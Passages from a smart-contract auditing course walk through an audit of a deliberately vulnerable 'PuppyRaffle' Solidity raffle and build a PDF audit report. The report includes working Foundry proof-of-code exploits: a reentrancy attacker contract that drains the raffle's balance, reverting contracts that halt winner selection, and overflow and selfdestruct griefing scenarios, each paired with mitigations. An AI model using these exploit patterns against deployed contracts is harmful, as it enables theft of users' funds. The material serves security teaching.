- **Impact:** Medium - potentially wastes gas, disrupts the functionality of the protocol when selectWinner continually reverts
- **Likelihood:** Low - the impact is only severe when there are a lot of users, so I think we can safely say low.

Sorted, lets fill out our finding template.

```
### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

**Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!

**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)
```

To briefly touch on our recommendations here - The reason disallowing smart contract entrants would not be a preferred mitigation, is that this would restrict situations like multisignature wallets from participating. We'd much rather not lock people out entirely.

For this reason the second recommendation is preferred. This established a really good design pattern known as `Pull over Push`, where ideally, the user is making a request for funds, instead of a protocol distributing them.

We've only got a few findings left! Let's keep going!
---
title: Recon - Refund
---

_Follow along with this video:_

---

### Return to Refund

Coming back to the refund function, let's have a closer look.

```js
/// @param playerIndex the index of the player to refund. You can find it externally by calling `getActivePlayerIndex`
/// @dev This function will allow there to be blank spots in the array
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    payable(msg.sender).sendValue(entranceFee);

    players[playerIndex] = address(0);
    emit RaffleRefunded(playerAddress);
}
```

This function takes a player's index, and checks the `players` array for the appropriate address. Following this we see two require statements.

```js
require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
require(playerAddress !=
  address(0), "PuppyRaffle: Player already refunded, or is not active");
```

The first is ensuring that only a player can refund their own ticket/fee.

The second, while a little less clear, makes more sense if we see how a player is handled after a refund is processed - their `players` index is set to `address(0)`. So the second require is meant to prevent multiple refunds this way.

```js
players[playerIndex] = address(0);
```

Before this however, we see the `sendValue` function being called. This is what returns the `entranceFee` back to the player.

---

`sendValue` may look unusual, this is just a simplfied method to transfer funds contained within the [**OpenZeppelin Address.sol library**](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/Address.sol).

> ```js
> function sendValue(address payable recipient, >uint256 amount) internal {
>        if (address(this).balance < amount) {
>            revert AddressInsufficientBalance(address(this));
>        }
>
>        (bool success, ) = recipient.call{value: amount}("");
>        if (!success) {
>            revert FailedInnerCall();
>        }
>    }
> ```

---

### Wrap Up

Already we can see the order of things is going to cause another potential issue. Do you know what it is? Can you spot it?
---
title: Adding The Audit To Our Portfolio
---

_Follow along with this video:_

---

### Adding to our Portfolio

Ok, we've - for the most part - completed the write ups for the findings we identified in Puppy Raffle. The next step is generatin our PDF report and adding this to our security portfolio!

First step, let's add what we need to our `audit-data` folder.

Boilerplating things is something you should get used to. This involves reusing assets and templating processes so that it's quick to get started. Here, we can grab our logo from our previous `PasswordStore` repo, and our formatted report template can be copied from [**`audit-report-templating`**](https://github.com/Cyfrin/audit-report-templating) repo into a new file we name `report-formatted.md` within our `audit-data` folder.



With this template in place, we can just begin filling it out. Start by adding your name and details to customize the report.

> **Note:** Keep an eye out for `//comments` in the report template below. This is where I'll have explained what's been added to each section.

View the report in the dropdown below, please know it's quiet long.


PDF Report Template

    ---
    title: Puppy Raffle Audit Report
    author: 
    date: January 12, 2024
    header-includes:
    - \usepackage{titling}
    - \usepackage{graphicx}
    ---

    \begin{titlepage}
        \centering
        \begin{figure}[h]
            \centering
            \includegraphics[width=0.5\textwidth]{logo.pdf}
        \end{figure}
        \vspace*{2cm}
        {\Huge\bfseries Protocol Audit Report\par}
        \vspace{1cm}
        {\Large Version 1.0\par}
        \vspace{2cm}
        {\Large\itshape Cyfrin.io\par}
        \vfill
        {\large \today\par}
    \end{titlepage}

    \maketitle

    

    Prepared by: 
    Lead Auditors:
    - 

    # Table of Contents
    - [Table of Contents](#table-of-contents)
    - [Protocol Summary](#protocol-summary)
    - [Disclaimer](#disclaimer)
    - [Risk Classification](#risk-classification)
    - [Audit Details](#audit-details)
    - [Scope](#scope)
    - [Roles](#roles)
    - [Executive Summary](#executive-summary)
    - [Issues found](#issues-found)
    - [Findings](#findings)
    - [High](#high)
    - [Medium](#medium)
    - [Low](#low)
    - [Informational](#informational)
    - [Gas](#gas)

    # Protocol Summary

    // You might want to write your own personal summary here for practice! We're going to steal some details from the protocol README

    This project is to enter a raffle to win a cute dog NFT. The protocol should do the following:

    - Call the enterRaffle function with the following parameters:
        - address[] participants: A list of addresses that enter. You can use this to enter yourself multiple times, or yourself and a group of your friends.
    - Duplicate addresses are not allowed
    - Users are allowed to get a refund of their ticket & value if they call the refund function
    - Every X seconds, the raffle will be able to draw a winner and be minted a random puppy
    - The owner of the protocol will set a feeAddress to take a cut of the value, and the rest of the funds will be sent to the winner of the puppy.


    # Disclaimer

    The YOUR_NAME_HERE team makes all effort to find as many vulnerabilities in the code in the given time period, but holds no responsibilities for the findings provided in this document. A security audit by the team is not an endorsement of the underlying business or product. The audit was time-boxed and the review of the code was solely on the security aspects of the Solidity implementation of the contracts.

    # Risk Classification

    |            |        | Impact |        |     |
    | ---------- | ------ | ------ | ------ | --- |
    |            |        | High   | Medium | Low |
    |            | High   | H      | H/M    | M   |
    | Likelihood | Medium | H/M    | M      | M/L |
    |            | Low    | M      | M/L    | L   |

    We use the [CodeHawks](https://docs.codehawks.com/hawks-auditors/how-to-evaluate-a-finding-severity) severity matrix to determine severity. See the documentation for more details.

    # Audit Details
    // Here we'll grab the commit hash
    Commit Hash: e30d199697bbc822b646d76533b66b7d529b8ef5

    ## Scope
    // Scope can be grabbed from the README as well, remember to replace the └── symbol!

    ./src/
    #-- PuppyRaffle.sol

    ## Roles
    // These details should be provided by the protocol, grab them from the README.

    - Owner - Deployer of the protocol, has the power to change the wallet address to which fees are sent through the changeFeeAddress function.
    - Player - Participant of the raffle, has the power to enter the raffle with the enterRaffle function and refund value through refund function.

    # Executive Summary
    // You can add any notes you'd like to this section to summarize your experience during the security review.

    I loved auditing this code base. Patrick is a wizard at writing intentionally bad code!

    ## Issues found

    | Severity | Number of issues found |
    | -------- | ---------------------- |
    | High     | 3                      |
    | Medium   | 3                      |
    | Low      | 1                      |
    | Info     | 7                      |
    | Gas      | 2                      |
    | Total    | 16                     |

    # Findings
    // Here we should be able to double check the formatting on our findings.md file and paste all of our findings here.

    ## High

    ### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain contract balance

    **Description:** The `PuppyRaffle::refund` function does not follow [CEI/FREI-PI](https://www.nascent.xyz/idea/youre-writing-require-statements-wrong) and as a result, enables participants to drain the contract balance.

    In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address, and only after making that external call, we update the `players` array.

    ```javascript
    function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

    @>  payable(msg.sender).sendValue(entranceFee);

    @>  players[playerIndex] = address(0);
        emit RaffleRefunded(playerAddress);
    }
    ```

    A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue to cycle this until the contract balance is drained.

    **Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

    **Proof of Concept:**

    1. Users enters the raffle.
    2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`.
    3. Attacker enters the raffle
    4. Attacker calls `PuppyRaffle::refund` from their contract, draining the contract balance.

    **Proof of Code:**

    
    Code
    Add the following code to the `PuppyRaffleTest.t.sol` file.

    ```javascript
    contract ReentrancyAttacker {
        PuppyRaffle puppyRaffle;
        uint256 entranceFee;
        uint256 attackerIndex;

        constructor(address _puppyRaffle) {
            puppyRaffle = PuppyRaffle(_puppyRaffle);
            entranceFee = puppyRaffle.entranceFee();
        }

        function attack() external payable {
            address[] memory players = new address[](1);
            players[0] = address(this);
            puppyRaffle.enterRaffle{value: entranceFee}(players);
            attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
            puppyRaffle.refund(attackerIndex);
        }

        fallback() external payable {
            if (address(puppyRaffle).balance >= entranceFee) {
                puppyRaffle.refund(attackerIndex);
            }
        }
    }

    function testReentrance() public playersEntered {
        ReentrancyAttacker attacker = new ReentrancyAttacker(address(puppyRaffle));
        vm.deal(address(attacker), 1e18);
        uint256 startingAttackerBalance = address(attacker).balance;
        uint256 startingContractBalance = address(puppyRaffle).balance;

        attacker.attack();

        uint256 endingAttackerBalance = address(attacker).balance;
        uint256 endingContractBalance = address(puppyRaffle).balance;
        assertEq(endingAttackerBalance, startingAttackerBalance + startingContractBalance);
        assertEq(endingContractBalance, 0);
    }
    ```
    

    **Recommended Mitigation:** To fix this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.

    ```diff
        function refund(uint256 playerIndex) public {
            address playerAddress = players[playerIndex];
            require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
            require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
    +       players[playerIndex] = address(0);
    +       emit RaffleRefunded(playerAddress);
            (bool success,) = msg.sender.call{value: entranceFee}("");
            require(success, "PuppyRaffle: Failed to refund player");
    -        players[playerIndex] = address(0);
    -        emit RaffleRefunded(playerAddress);
        }
    ```

    ### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows anyone to choose winner

    **Description:** Hashing `msg.sender`, `block.timestamp`, `block.difficulty` together creates a predictable final number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

    **Impact:** Any user can choose the winner of the raffle, winning the money and selecting the "rarest" puppy, essentially making it such that all puppies have the same rarity, since you can choose the puppy.

    **Proof of Concept:**

    There are a few attack vectors here.

    1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that knowledge to predict when / how to participate. See the [solidity blog on prevrando](https://soliditydeveloper.com/prevrandao) here. `block.difficulty` was recently replaced with `prevrandao`.
    2. Users can manipulate the `msg.sender` value to result in their index being the winner.

    Using on-chain values as a randomness seed is a [well-known attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

    **Recommended Mitigation:** Consider using an oracle for your randomness like [Chainlink VRF](https://docs.chain.link/vrf/v2/introduction).

    ### [H-3] Integer overflow of `PuppyRaffle::totalFees` loses fees

    **Description:** In Solidity versions prior to `0.8.0`, integers were subject to integer overflows.

    ```javascript
    uint64 myVar = type(uint64).max;
    // myVar will be 18446744073709551615
    myVar = myVar + 1;
    // myVar will be 0
    ```

    **Impact:** In `PuppyRaffle::selectWinner`, `totalFees` are accumulated for the `feeAddress` to collect later in `withdrawFees`. However, if the `totalFees` variable overflows, the `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

    **Proof of Concept:**
    3. We first conclude a raffle of 4 players to collect some fees.
    4. We then have 89 additional players enter a new raffle, and we conclude that raffle as well.
    5. `totalFees` will be:
    ```javascript
    totalFees = totalFees + uint64(fee);
    // substituted
    totalFees = 800000000000000000 + 17800000000000000000;
    // due to overflow, the following is now the case
    totalFees = 153255926290448384;
    ```
    6. You will now not be able to withdraw, due to this line in `PuppyRaffle::withdrawFees`:
    ```javascript
    require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ```

    Although you could use `selfdestruct` to send ETH to this contract in order for the values to match and withdraw the fees, this is clearly not what the protocol is intended to do.

    
    Proof Of Code
    Place this into the `PuppyRaffleTest.t.sol` file.

    ```javascript
    function testTotalFeesOverflow() public playersEntered {
            // We finish a raffle of 4 to collect some fees
            vm.warp(block.timestamp + duration + 1);
            vm.roll(block.number + 1);
            puppyRaffle.selectWinner();
            uint256 startingTotalFees = puppyRaffle.totalFees();
            // startingTotalFees = 800000000000000000

            // We then have 89 players enter a new raffle
            uint256 playersNum = 89;
            address[] memory players = new address[](playersNum);
            for (uint256 i = 0; i < playersNum; i++) {
                players[i] = address(i);
            }
            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
            // We end the raffle
            vm.warp(block.timestamp + duration + 1);
            vm.roll(block.number + 1);

            // And here is where the issue occurs
            // We will now have fewer fees even though we just finished a second raffle
            puppyRaffle.selectWinner();

            uint256 endingTotalFees = puppyRaffle.totalFees();
            console.log("ending total fees", endingTotalFees);
            assert(endingTotalFees < startingTotalFees);

            // We are also unable to withdraw any fees because of the require check
            vm.prank(puppyRaffle.feeAddress());
            vm.expectRevert("PuppyRaffle: There are currently players active!");
            puppyRaffle.withdrawFees();
        }
    ```
    

    **Recommended Mitigation:** There are a few recommended mitigations here.

    7. Use a newer version of Solidity that does not allow integer overflows by default.

    ```diff
    - pragma solidity ^0.7.6;
    + pragma solidity ^0.8.18;
    ```

    Alternatively, if you want to use an older version of Solidity, you can use a library like OpenZeppelin's `SafeMath` to prevent integer overflows.

    1. Use a `uint256` instead of a `uint64` for `totalFees`.

    ```diff
    - uint64 public totalFees = 0;
    + uint256 public totalFees = 0;
    ```

    1. Remove the balance check in `PuppyRaffle::withdrawFees`

    ```diff
    - require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
    ```

    We additionally want to bring your attention to another attack vector as a result of this line in a future finding.

    ### [H-4] Malicious winner can forever halt the raffle
    

    **Description:** Once the winner is chosen, the `selectWinner` function sends the prize to the the corresponding address with an external call to the winner account.

    ```javascript
    (bool success,) = winner.call{value: prizePool}("");
    require(success, "PuppyRaffle: Failed to send prize pool to winner");
    ```

    If the `winner` account were a smart contract that did not implement a payable `fallback` or `receive` function, or these functions were included but reverted, the external call above would fail, and execution of the `selectWinner` function would halt. Therefore, the prize would never be distributed and the raffle would never be able to start a new round.

    There's another attack vector that can be used to halt the raffle, leveraging the fact that the `selectWinner` function mints an NFT to the winner using the `_safeMint` function. This function, inherited from the `ERC721` contract, attempts to call the `onERC721Received` hook on the receiver if it is a smart contract. Reverting when the contract does not implement such function.

    Therefore, an attacker can register a smart contract in the raffle that does not implement the `onERC721Received` hook expected. This will prevent minting the NFT and will revert the call to `selectWinner`.

    **Impact:** In either case, because it'd be impossible to distribute the prize and start a new round, the raffle would be halted forever.

    **Proof of Concept:**

    
    Proof Of Code
    Place the following test into `PuppyRaffleTest.t.sol`.

    ```javascript
    function testSelectWinnerDoS() public {
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        address[] memory players = new address[](4);
        players[0] = address(new AttackerContract());
        players[1] = address(new AttackerContract());
        players[2] = address(new AttackerContract());
        players[3] = address(new AttackerContract());
        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

        vm.expectRevert();
        puppyRaffle.selectWinner();
    }
    ```

    For example, the `AttackerContract` can be this:

    ```javascript
    contract AttackerContract {
        // Implements a `receive` function that always reverts
        receive() external payable {
            revert();
        }
    }
    ```

    Or this:

    ```javascript
    contract AttackerContract {
        // Implements a `receive` function to receive prize, but does not implement `onERC721Received` hook to receive the NFT.
        receive() external payable {}
    }
    ```
    

    **Recommended Mitigation:** Favor pull-payments over push-payments. This means modifying the `selectWinner` function so that the winner account has to claim the prize by calling a function, instead of having the contract automatically send the funds during execution of `selectWinner`.

    ## Medium

    ### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential DoS vector, incrementing gas costs for future entrants

    **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle:players` array is, the more checks a new player will have to make. This means that the gas costs for players who enter right when the raffle starts will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

    **Note to students: This next line would likely be it's own finding itself. However, we haven't taught you about MEV yet, so we are going to ignore it.**
    Additionally, this increased gas cost creates front-running opportunities where malicious users can front-run another raffle entrant's transaction, increasing its costs, so their enter transaction fails.

    **Impact:** The impact is two-fold.

    1. The gas costs for raffle entrants will greatly increase as more players enter the raffle.
    2. Front-running opportunities are created for malicious users to increase the gas costs of other users, so their transaction fails.

    **Proof of Concept:**

    If we have 2 sets of 100 players enter, the gas costs will be as such:
    - 1st 100 players: 6252039
    - 2nd 100 players: 18067741

    This is more than 3x as expensive for the second set of 100 players!

    This is due to the for loop in the `PuppyRaffle::enterRaffle` function.

    ```javascript
            // Check for duplicates
    @>      for (uint256 i = 0; i < players.length - 1; i++) {
                for (uint256 j = i + 1; j < players.length; j++) {
                    require(players[i] != players[j], "PuppyRaffle: Duplicate player");
                }
            }
    ```

    
    Proof Of Code
    Place the following test into `PuppyRaffleTest.t.sol`.

    ```javascript
    function testReadDuplicateGasCosts() public {
            vm.txGasPrice(1);

            // We will enter 5 players into the raffle
            uint256 playersNum = 100;
            address[] memory players = new address[](playersNum);
            for (uint256 i = 0; i < playersNum; i++) {
                players[i] = address(i);
            }
            // And see how much gas it cost to enter
            uint256 gasStart = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
            uint256 gasEnd = gasleft();
            uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
            console.log("Gas cost of the 1st 100 players:", gasUsedFirst);

            // We will enter 5 more players into the raffle
            for (uint256 i = 0; i < playersNum; i++) {
                players[i] = address(i + playersNum);
            }
            // And see how much more expensive it is
            gasStart = gasleft();
            puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
            gasEnd = gasleft();
            uint256 gasUsedSecond = (gasStart - gasEnd) * tx.gasprice;
            console.log("Gas cost of the 2nd 100 players:", gasUsedSecond);

            assert(gasUsedFirst < gasUsedSecond);
            // Logs:
            //     Gas cost of the 1st 100 players: 6252039
            //     Gas cost of the 2nd 100 players: 18067741
    }
    ```
    

    **Recommended Mitigation:** There are a few recommended mitigations.

    1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
    2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

    ```diff
    +    mapping(address => uint256) public addressToRaffleId;
    +    uint256 public raffleId = 0;
        .
        .
        .
        function enterRaffle(address[] memory newPlayers) public payable {
            require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
            for (uint256 i = 0; i < newPlayers.length; i++) {
                players.push(newPlayers[i]);
    +            addressToRaffleId[newPlayers[i]] = raffleId;
            }

    -        // Check for duplicates
    +       // Check for duplicates only from the new players
    +       for (uint256 i = 0; i < newPlayers.length; i++) {
    +          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
    +       }
    -        for (uint256 i = 0; i < players.length; i++) {
    -            for (uint256 j = i + 1; j < players.length; j++) {
    -                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    -            }
    -        }
            emit RaffleEnter(newPlayers);
        }
    .
    .
    .
        function selectWinner() external {
    +       raffleId = raffleId + 1;
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    ```

    Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

    ### [M-2] Balance check on `PuppyRaffle::withdrawFees` enables griefers to selfdestruct a contract to send ETH to the raffle, blocking withdrawals

    **Description:** The `PuppyRaffle::withdrawFees` function checks the `totalFees` equals the ETH balance of the contract (`address(this).balance`). Since this contract doesn't have a `payable` fallback or `receive` function, you'd think this wouldn't be possible, but a user could `selfdesctruct` a contract with ETH in it and force funds to the `PuppyRaffle` contract, breaking this check.

    ```javascript
        function withdrawFees() external {
    @>      require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
            uint256 feesToWithdraw = totalFees;
            totalFees = 0;
            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
            require(success, "PuppyRaffle: Failed to withdraw fees");
        }
    ```

    **Impact:** This would prevent the `feeAddress` from withdrawing fees. A malicious user could see a `withdrawFee` transaction in the mempool, front-run it, and block the withdrawal by sending fees.

    **Proof of Concept:**

    1. `PuppyRaffle` has 800 wei in it's balance, and 800 totalFees.
    2. Malicious user sends 1 wei via a `selfdestruct`
    3. `feeAddress` is no longer able to withdraw funds

    **Recommended Mitigation:** Remove the balance check on the `PuppyRaffle::withdrawFees` function.

    ```diff
        function withdrawFees() external {
    -       require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
            uint256 feesToWithdraw = totalFees;
            totalFees = 0;
            (bool success,) = feeAddress.call{value: feesToWithdraw}("");
            require(success, "PuppyRaffle: Failed to withdraw fees");
        }
    ```

    ### [M-3] Unsafe cast of `PuppyRaffle::fee` loses fees

    **Description:** In `PuppyRaffle::selectWinner` their is a type cast of a `uint256` to a `uint64`. This is an unsafe cast, and if the `uint256` is larger than `type(uint64).max`, the value will be truncated.

    ```javascript
        function selectWinner() external {
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
            require(players.length > 0, "PuppyRaffle: No players in raffle");

            uint256 winnerIndex = uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 fee = totalFees / 10;
            uint256 winnings = address(this).balance - fee;
    @>      totalFees = totalFees + uint64(fee);
            players = new address[](0);
            emit RaffleWinner(winner, winnings);
        }
    ```

    The max value of a `uint64` is `18446744073709551615`. In terms of ETH, this is only ~`18` ETH. Meaning, if more than 18ETH of fees are collected, the `fee` casting will truncate the value.

    **Impact:** This means the `feeAddress` will not collect the correct amount of fees, leaving fees permanently stuck in the contract.

    **Proof of Concept:**

    1. A raffle proceeds with a little more than 18 ETH worth of fees collected
    2. The line that casts the `fee` as a `uint64` hits
    3. `totalFees` is incorrectly updated with a lower amount

    You can replicate this in foundry's chisel by running the following:

    ```javascript
    uint256 max = type(uint64).max
    uint256 fee = max + 1
    uint64(fee)
    // prints 0
    ```

    **Recommended Mitigation:** Set `PuppyRaffle::totalFees` to a `uint256` instead of a `uint64`, and remove the casting. Their is a comment which says:

    ```javascript
    // We do some storage packing to save gas
    ```
    But the potential gas saved isn't worth it if we have to recast and this bug exists.

    ```diff
    -   uint64 public totalFees = 0;
    +   uint256 public totalFees = 0;
    .
    .
    .
        function selectWinner() external {
            require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
            require(players.length >= 4, "PuppyRaffle: Need at least 4 players");
            uint256 winnerIndex =
                uint256(keccak256(abi.encodePacked(msg.sender, block.timestamp, block.difficulty))) % players.length;
            address winner = players[winnerIndex];
            uint256 totalAmountCollected = players.length * entranceFee;
            uint256 prizePool = (totalAmountCollected * 80) / 100;
            uint256 fee = (totalAmountCollected * 20) / 100;
    -       totalFees = totalFees + uint64(fee);
    +       totalFees = totalFees + fee;
    ```

    ### [M-4] Smart Contract wallet raffle winners without a `receive` or a `fallback` will block the start of a new contest

    **Description:** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery. However, if the winner is a smart contract wallet that rejects payment, the lottery would not be able to restart.

    Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

    **Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

    Also, true winners would not be able to get paid out, and someone else would win their money!

    **Proof of Concept:**
    1. 10 smart contract wallets enter the lottery without a fallback or receive function.
    2. The lottery ends
    3. The `selectWinner` function wouldn't work, even though the lottery is over!

    **Recommended Mitigation:** There are a few options to mitigate this issue.

    4. Do not allow smart contract wallet entrants (not recommended)
    5. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)

    ## Informational / Non-Critical

    ### [I-1] Floating pragmas

    **Description:** Contracts should use strict versions of solidity. Locking the version ensures that contracts are not deployed with a different version of solidity than they were tested with. An incorrect version could lead to uninteded results.

    https://swcregistry.io/docs/SWC-103/

    **Recommended Mitigation:** Lock up pragma versions.

    ```diff
    - pragma solidity ^0.7.6;
    + pragma solidity 0.7.6;
    ```

    ### [I-2] Magic Numbers

    **Description:** All number literals should be replaced with constants. This makes the code more readable and easier to maintain. Numbers without context are called "magic numbers".

    **Recommended Mitigation:** Replace all magic numbers with constants.

    ```diff
    +       uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
    +       uint256 public constant FEE_PERCENTAGE = 20;
    +       uint256 public constant TOTAL_PERCENTAGE = 100;
    .
    .
    .
    -        uint256 prizePool = (totalAmountCollected * 80) / 100;
    -        uint256 fee = (totalAmountCollected * 20) / 100;
            uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / TOTAL_PERCENTAGE;
            uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / TOTAL_PERCENTAGE;
    ```

    ### [I-3] Test Coverage

    **Description:** The test coverage of the tests are below 90%. This often means that there are parts of the code that are not tested.

    ```
    | File                               | % Lines        | % Statements   | % Branches     | % Funcs       |
    | ---------------------------------- | -------------- | -------------- | -------------- | ------------- |
    | script/DeployPuppyRaffle.sol       | 0.00% (0/3)    | 0.00% (0/4)    | 100.00% (0/0)  | 0.00% (0/1)   |
    | src/PuppyRaffle.sol                | 82.46% (47/57) | 83.75% (67/80) | 66.67% (20/30) | 77.78% (7/9)  |
    | test/auditTests/ProofOfCodes.t.sol | 100.00% (7/7)  | 100.00% (8/8)  | 50.00% (1/2)   | 100.00% (2/2) |
    | Total                              | 80.60% (54/67) | 81.52% (75/92) | 65.62% (21/32) | 75.00% (9/12) |
    ```

    **Recommended Mitigation:** Increase test coverage to 90% or higher, especially for the `Branches` column.

    ### [I-4] Zero address validation

    **Description:** The `PuppyRaffle` contract does not validate that the `feeAddress` is not the zero address. This means that the `feeAddress` could be set to the zero address, and fees would be lost.

    ```
    PuppyRaffle.constructor(uint256,address,uint256)._feeAddress (src/PuppyRaffle.sol#57) lacks a zero-check on :
                    - feeAddress = _feeAddress (src/PuppyRaffle.sol#59)
    PuppyRaffle.changeFeeAddress(address).newFeeAddress (src/PuppyRaffle.sol#165) lacks a zero-check on :
                    - feeAddress = newFeeAddress (src/PuppyRaffle.sol#166)
    ```

    **Recommended Mitigation:** Add a zero address check whenever the `feeAddress` is updated.

    ### [I-5] _isActivePlayer is never used and should be removed

    **Description:** The function `PuppyRaffle::_isActivePlayer` is never used and should be removed.

    ```diff
    -    function _isActivePlayer() internal view returns (bool) {
    -        for (uint256 i = 0; i < players.length; i++) {
    -            if (players[i] == msg.sender) {
    -                return true;
    -            }
    -        }
    -        return false;
    -    }
    ```

    ### [I-6] Unchanged variables should be constant or immutable

    Constant Instances:
    ```
    PuppyRaffle.commonImageUri (src/PuppyRaffle.sol#35) should be constant
    PuppyRaffle.legendaryImageUri (src/PuppyRaffle.sol#45) should be constant
    PuppyRaffle.rareImageUri (src/PuppyRaffle.sol#40) should be constant
    ```

    Immutable Instances:

    ```
    PuppyRaffle.raffleDuration (src/PuppyRaffle.sol#21) should be immutable
    ```

    ### [I-7] Potentially erroneous active player index

    **Description:** The `getActivePlayerIndex` function is intended to return zero when the given address is not active. However, it could also return zero for an active address stored in the first slot of the `players` array. This may cause confusions for users querying the function to obtain the index of an active player.

    **Recommended Mitigation:** Return 2**256-1 (or any other sufficiently high number) to signal that the given player is inactive, so as to avoid collision with indices of active players.

    ### [I-8] Zero address may be erroneously considered an active player

    **Description:** The `refund` function removes active players from the `players` array by setting the corresponding slots to zero. This is confirmed by its documentation, stating that "This function will allow there to be blank spots in the array". However, this is not taken into account by the `getActivePlayerIndex` function. If someone calls `getActivePlayerIndex` passing the zero address after there's been a refund, the function will consider the zero address an active player, and return its index in the `players` array.

    **Recommended Mitigation:** Skip zero addresses when iterating the `players` array in the `getActivePlayerIndex`. Do note that this change would mean that the zero address can _never_ be an active player. Therefore, it would be best if you also prevented the zero address from being registered as a valid player in the `enterRaffle` function.

    ## Gas

    ### [G-2] Storage Variables in a Loop Should be Cached

    Everytime you call `players.length` you read from storage, as opposed to memory which is more gas efficient.

    ```diff
    + uint256 playersLength = players.length;
    - for (uint256 i = 0; i < players.length - 1; i++) {
    + for (uint256 i = 0; i < playersLength - 1; i++) {
    -    for (uint256 j = i + 1; j < players.length; j++) {
    +    for (uint256 j = i + 1; j < playersLength; j++) {
        require(players[i] != players[j], "PuppyRaffle: Duplicate player");
    }
    }
    ```
    ### [G-1] Unchanged state variables should be declared constant or immutable

    Reading from storage is much more expensive than reading a constant or immutable variable.

    Instances:

    - `PuppyRaffle::raffleDuration` should be `immutable`
    - `PuppyRaffle::commonImageUri` should be `constant`
    - `PuppyRaffle::rareImageUri` should be `constant`
    - `PuppyRaffle::legendaryImageUri` should be `constant`



---

The final step, once the template has been filled out is to run our CLI command

```bash
pandoc report-formatted.md -o report.pdf --from markdown --template=eisvogel --listings
```

### Wrap Up

And with that - you should have a PHENOMENAL audit report to add to your security portfolio! The very next thing you need to do is add this PDF to the GitHub repository you made in the previous section. Tracking your progress and cataloging your experience is how you'll get your name out there and show the world what you know. Even audit firms like Cyfrin do this!

Huge congratulations, let's bring this section home!

---

Similarly to the previous PDF generating lesson, I'll include some common pitfalls and solutions you can reference here, should you run into issues in this process.


Errors/Issues

1. **My home/root directory doesn't have a `.pandoc` file!**

   - Depending on your operating system, this file may exist elsewhere. If you're using WSL/Linux keep a few things in mind

